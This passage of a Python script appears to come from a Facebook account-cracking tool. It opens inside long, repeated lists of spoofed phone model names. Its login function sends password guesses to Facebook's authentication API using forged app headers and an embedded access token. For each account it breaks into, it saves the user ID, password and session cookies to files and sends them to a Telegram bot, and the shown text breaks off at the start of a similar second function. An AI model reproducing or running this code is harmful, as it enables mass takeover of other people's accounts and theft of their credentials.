558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T;X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T')
    uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(sm_mdl))+";FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M7{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    ua = ua_valid()
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent':uaD2,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://a'+'pi.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m8(ids,pwv):
    global loop,oks,cps
    model=["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    uax = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950308;FBDM/{density=2.325,width=1200,height=1854};FBLC/ru_RU;FBRV/336982524;FBCR/Beeline;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/"+str(random.choice(sm_mdl))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M8{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    ua = ua_valid()
    warna = random.choice(my_color)
    try:
        for pas in pwv:
